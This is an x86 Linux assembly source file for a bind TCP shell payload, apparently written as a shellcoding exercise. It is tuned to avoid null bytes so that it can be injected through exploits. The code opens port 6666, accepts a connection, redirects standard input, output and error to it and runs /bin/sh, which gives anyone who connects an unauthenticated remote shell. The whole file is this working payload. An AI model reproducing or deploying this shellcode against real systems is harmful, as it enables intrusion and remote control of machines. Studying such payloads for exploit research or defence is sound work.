; Linux x86 - Bind TCP shell
; Filename: bind_tcp_initial_nonull.asm
; Author: Hodorsec

global _start
section .text

_start:

; Creating socket 
	; int socket(int domain, int type, int protocol);
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

	; BEGIN OLD CODE COMMENTED DUE TO NULL BYTES
	; mov eax, 102   ; socketcall
	; mov ebx, 1       ; socketcall type 1 (sys_socket)
	; push 0             ; IPPROTO_IP 0
	; push 1             ; SOCK_STREAM 1
	; push 2             ; AF_INET 2
	; END OLD CODE COMMENTED DUE TO NULL BYTES

	push 102   		; socketcall, push on the stack
	pop eax			; Put the value of 102 in EAX

	push 1			; socketcall type 1 (sys_socket), push on the stack
	pop ebx			; Put the value of 1 in EBX
	
	; Socket arguments
	xor esi, esi		; Clear ESI
	push esi		; IPPROTO_IP 0
	push 1        		; SOCK_STREAM 1 
	push 2          	; AF_INET 2
 
	mov ecx, esp   		; Save the pointer for arguments  
	int 0x80        	; Syscall to call function with arguments
	
	; mov edx, eax   		; Saved socket FD in EDX
	xchg edx, eax		; Saved socket FD in EDX, via xhg, saves a byte


; Setting variables for socket
	; Struct sockaddr_in
        ; sockaddr.sin_family = AF_INET; // Address family TCP
        ; sockaddr.sin_port = htons(port); // Port number as declared by 'port'
        ; sockaddr.sin_addr.s_addr = INADDR_ANY; // Accept from any address

	; BEGIN OLD CODE COMMENTED DUE TO NULL BYTES
	; push 0                          ; INADDR_ANY
	; mov ebx, 2                        ; socketcall type 2 (sys_bind)
	; BEGIN OLD CODE COMMENTED DUE TO NULL BYTES

	push esi		; INADDR_ANY, still being clean after previous xor, push 0 on stack
	push WORD 0x0a1a	; TCP port 6666, 0x1a0a in little endian format
	push WORD 2		; AF_INET 2
	mov ecx, esp		; Save pointer to sockaddr_in structure

; Bind the port
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; bind(sock, (struct sockaddr *) &sockaddr, sizeof(sockaddr));	

	; BEGIN OLD CODE COMMENTED DUE TO NULL BYTES
	; mov eax, 102                    ; socketcall
	; mov ebx, 2                        ; socketcall type 2 (sys_bind)
	; END OLD CODE COMMENTED DUE TO NULL BYTES

	mov al, 102		; socketcall
	mov bl, 2		; socketcall type 2 (sys_bind)

	; sys_bind arguments
	push 16                 ; sockaddr struct, sizeof(struct sockaddr) = 16
	push ecx                ; Pointer to sockaddr_in
	push edx                ; FD socket

	mov ecx, esp            ; Argument array pointer
	int 0x80                ; syscall, calling with arguments

; Listen on address
	; int listen(int sockfd, int backlog);
        ; listen(sock, 0);


	; BEGIN OLD CODE COMMENTED DUE TO NULL BYTES
	; mov eax, 102                        ; socketcall
	; mov ebx, 4                            ; socketcall type 4 (sys_listen)
	; push 0                                  ; Queue size
	; END OLD CODE COMMENTED DUE TO NULL BYTES
	
	mov al, 102		; socketcall
	mov bl, 4		; socketcall type 4 (sys_listen)

	; sys_listen arguments
	push esi		; Still being cleared and containing null, push 0
	push edx                ; Sockfd stored previously in EDX

	mov ecx, esp            ; Argument array pointer
	int 0x80                ; Syscall, calling with arguments

; Accept connections
        ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
        ; client = accept(sock, NULL, NULL);

	; BEGIN OLD CODE COMMENTED DUE TO NULL BYTES
	; mov eax, 102                    ; socketcall
	; mov ebx, 5                        ; socketcall type 5 (sys_accept)
	; push 0                              ; NULL
	; push 0                              ; NULL
	; END OLD CODE COMMENTED DUE TO NULL BYTES

	mov al, 102		; socketcall
	mov bl, 5		; socketcall type 5 (sys_accept)

	; sys_accept arguments
	push esi		; Still being NULL
	push esi		; Still being NULL
	push edx                ; Sockfd stored previously in EDX

	mov ecx, esp            ; Argument array pointer
	int 0x80                ; Syscall, calling with arguments
	; mov edx, eax            ; Store the FD socket being returned
	xchg edx, eax		; Store the FD socket being return, using xchg saving a byte

; Redirect input, output and errors
        ; Redirect input, output and errors
        ; int dup2(int oldfd, int newfd);
        ; dup2(client, 0); // STDIN
        ; dup2(client, 1); // STDOUT
        ; dup2(client, 2); // STDERR


	; BEGIN OLD CODE COMMENTED DUE TO NULL BYTES
	; mov eax, 63                     ; syscall, dup2
	; mov ebx, edx                    ; The used Client FD stored previously in EDX
	; mov ecx, 0                      ; STDIN
	; mov eax, 63                     ; socketcall, dup2
	; mov ebx, edx                    ; The used Client FD stored previously in EDX
	; mov ecx, 1                      ; STDOUT
	; mov eax, 63                     ; socketcall, dup2
	; mov ebx, edx                    ; The used Client FD stored previously in EDX
	; mov ecx, 2                      ; STDERR
	; END OLD CODE COMMENTED DUE TO NULL BYTES

	; STDIN
	mov al, 63		; syscall, dup2
	; mov ebx, edx		; The used Client FD stored previously in EDX
	xchg ebx, edx		; The used Client FD stored previously in EDX, using xchg saving a byte
	mov ecx, esi		; Still being NULL ESI, put 0
	int 0x80		; Syscall

	; STDOUT
	mov al, 63		; syscall, dup2
	inc cl			; Put 1 in ECX
	int 0x80		; Syscall

	; STDERR
	mov al, 63		; syscall, dup2
	inc cl			; Put 2 in ECX
	int 0x80                ; Syscall, calling with arguments

; Execute shell
        ; int execve(const char *filename, char *const argv[], char *const envp[]);
        ; execve("/bin/sh", NULL, NULL);


	; BEGIN OLD CODE COMMENTED DUE TO NULL BYTES
	; mov eax, 11                     ; syscall, execve
	; push 0                              ; Terminate string with null byte
	; mov ecx, 0                      ; NULL
	; mov edx, 0                      ; NULL
	; END OLD CODE COMMENTED DUE TO NULL BYTES

	mov al, 11		; syscall, execve

	; Push “/bin//sh” on the stack
	push esi		; Null terminate string
	push 0x68732f2f         ; hs//
	push 0x6e69622f         ; nib/

	mov ebx, esp            ; String pointer for ‘/bin//sh’
	mov ecx, esi		; NULL
	; mov edx, esi		; NULL
	xchg edx, esi		; NULL, using chg saving a byte

	int 0x80                ; Do some magic

